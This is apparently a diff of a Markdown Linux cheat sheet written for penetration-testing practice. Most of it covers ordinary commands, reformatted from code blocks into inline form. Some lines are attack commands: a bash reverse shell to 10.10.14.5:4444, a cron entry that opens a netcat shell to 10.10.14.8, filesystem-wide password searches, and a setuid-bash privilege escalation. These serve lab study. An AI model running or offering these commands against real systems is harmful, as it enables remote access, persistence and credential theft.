@@ -10,6 +10,7 @@ Linux consists of:
 * **Kernel** → Manages CPU, memory, processes.
 * **Shell** → Interface for user commands.
 * **File System** → Stores data & configurations.
+List kernel modules – find vulnerable ones: `lsmod`
 
 # File System Hierarchy
 | Directory  | Purpose                                            |
@@ -49,71 +50,18 @@ Example: `man sudo` or `grep -r "ssh" /usr/share/man/`
 # 🖥️ System Information
 | Command    | Purpose      |
 | ---------- | ------------ |
-| `uname -a` | Kernel info  |
+| `uname -a` | Kernel, hostname, version, os info  |
 | `df -h`    | Disk usage   |
 | `free -m`  | Memory usage |
 | `lscpu`    | CPU info     |
 
-**Example:**
-
-```bash
-cat /proc/version
-```
-
-```bash
-ps aux | grep root
-```
+Example: `cat /proc/version` or `ps aux | grep root`
 
 ---
 
+## Working with Linux
 
-
-### Good Commands
-+ ssh [username]@[IP address] - SSH Login  
-+ uname -a - Print all information about the machine in a specific order: kernel name, hostname, the kernel release, kernel version, machine hardware name, and operating system.  
-
-
-
-```
-**Example (privilege escalation enumeration):**
-
-```bash
-lsmod          # List kernel modules – find vulnerable ones
-```
-
-```bash
-sudo -l        # Check if current user can run privileged commands
-```
-**Example (find passwords):**
-
-```bash
-find / -name "*.conf" 2>/dev/null
-```
-
-```bash
-grep -r "password" /etc/ 2>/dev/null
-```
-**Example (reverse shell):**
-
-```bash
-bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
-```
-
-```bash
-/bin/sh -c 'echo exploited!'
-```
-
----
-
----
-
-
-
-## 📌 Workflow
-
----
-
-# 📂 Navigation
+# Navigation
 
 | Command  | Purpose                 |
 | -------- | ----------------------- |
@@ -121,33 +69,12 @@ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
 | `cd`     | Change directory        |
 | `ls -la` | View files incl. hidden |
 
-**Example:**
+# Working with Files & Directories
 
-```bash
-cd ../../etc
-```
+Creating a file: `touch exploit.sh`
+Copying a file: `cp /etc/passwd /tmp/pass_backup`
 
-```bash
-ls -la /home/
-```
-
----
-
-# 📄 Working with Files & Directories
-
-**Example:**
-
-```bash
-touch exploit.sh
-```
-
-```bash
-cp /etc/passwd /tmp/pass_backup
-```
-
----
-
-# ✏️ Editing Files
+# Editing Files
 
 | Tool   | Purpose         |
 | ------ | --------------- |
@@ -155,81 +82,37 @@ cp /etc/passwd /tmp/pass_backup
 | `vim`  | Advanced editor |
 | `sed`  | Inline editing  |
 
-**Example:**
+Passing test into a file: `echo "hello world" >> notes.txt`
 
-```bash
-sed -i 's/false/true/' config.txt
-```
+# Find Files & Directories
+Find all text tiles in root: `find / -name "*.txt" 2>/dev/null`
+Find SUID binaries: `find / -perm -4000 2>/dev/null`
+Find congig files where secrets may be: `find / -name "*.conf" 2>/dev/null`
+Fine Passwords in root: `grep -r "password" / 2>/dev/null`
 
-```bash
-echo "bash reverse shell" >> notes.txt
-```
 
----
+# Filter Contents 
+Example: `cat file.txt | grep -E "[0-9]{10}"`
 
-# 🔍 Find Files & Directories
-
-**Example:**
-
-```bash
-find / -name "*.txt" 2>/dev/null
-```
-
-```bash
-find / -perm -4000 2>/dev/null  # Find SUID binaries
-```
-
----
-
-# 📑 Filter Contents / Regex
-
-```bash
-grep -r "password" /etc/
-```
-
-```bash
-cat file.txt | grep -E "[0-9]{10}"
-```
-
----
-
-# 🔐 Permissions Management
-
+# Permissions Management
 | Command           | Purpose            |
 | ----------------- | ------------------ |
 | `chmod`           | Change permissions |
 | `chown`           | Change ownership   |
 | `getfacl/setfacl` | ACL management     |
 
-**Example (priv-esc):**
-
-```bash
-chmod +s /bin/bash   # Bad! Enables root shell
-```
-
-```bash
-find / -writable -type f 2>/dev/null
-```
+Example (priv-esc): `chmod +s /bin/bash`   # Bad! Enables root shell
+Finds writable files: `find / -writable -type f 2>/dev/null`
 
 ---
 
-## 🧠 System Management
+## System Management
 
----
+# User Management
+Look for users: `cat /etc/passwd`
+Create user: `sudo useradd testuser`
 
-# 👥 User Management
-
-```bash
-cat /etc/passwd
-```
-
-```bash
-sudo useradd testuser
-```
-
----
-
-# 📦 Package Management
+# Package Management
 
 | Distro        | Tool                |
 | ------------- | ------------------- |
@@ -238,80 +121,37 @@ sudo useradd testuser
 | Arch          | `pacman`            |
 | Solaris       | `pkgadd`, `pkgrm`   |
 
-**Example:**
+Example install command: `apt install net-tools`
 
-```bash
-apt install net-tools
-```
+# Service & Process Management
+Check service status: `systemctl status nginx`
+Check services with filtering: `ps aux | grep root`
 
----
+# Task Scheduling (Cron)
+List scheduled tasks: `crontab -l`
+Create scheduled task `echo "* * * * * /bin/bash -c 'nc -e /bin/bash 10.10.14.8 4444'" >> cronjob`
 
-# ⚙️ Service & Process Management
+# Network Services
+Check network interfaces: `nano /etc/network/interfaces/xx`  
 
-```bash
-systemctl status nginx
-```
-
-```bash
-ps aux | grep root
-```
-
----
-
-# ⏱ Task Scheduling (Cron)
-
-**Example:**
-
-```bash
-crontab -l
-```
-
-```bash
-echo "* * * * * /bin/bash -c 'nc -e /bin/bash 10.10.14.8 4444'" >> cronjob
-```
-
----
-
-# 🌐 Network Services
-
-```bash
-ss -tulpn
-```
-
-```bash
-netstat -ano
-```
-
----
+Netstat is used to display active network connections and their associated ports.  
+Check active connections: `netstat -ano`
 
 # 💻 Web Services
+Look at a website via CLI: `curl http://10.10.10.5`
+Download files from FTP or HTTP servers: `wget http://10.10.10.5`
+Start the Python 3 web server:`python3 -m http.server 80`
 
-```bash
-curl http://10.10.10.5
-```
-
-```bash
-python3 -m http.server 80
-```
-
----
-
-# 📦 Backup & Restore
-
-```bash
-tar -czvf backup.tar.gz /etc/
-```
-
-```bash
-rsync -av /src /dest
-```
-
----
+# Backup & Restore
+Backup a local Directory to our Remote Server: `rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory`
+Zip a folder: `tar -czvf backup.tar.gz /etc/`
 
 # 📁 File System Management
-
+List mounted items: `df -h`
+List disks: `sudo fdisk -l`
+Mounting a disk or file system: `mount /dev/sda1 /mnt` or via fstab `nano /etc/fstab`
 ```bash
-mount /dev/sda1 /mnt
+
 ```
 
 ```bash
@@ -390,7 +230,9 @@ ufw status
 ```bash
 iptables -L
 ```
+reverse shell):`bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
 
+---
 ---
 
 # 📋 Linux Cheat Sheet (Quick Reference)
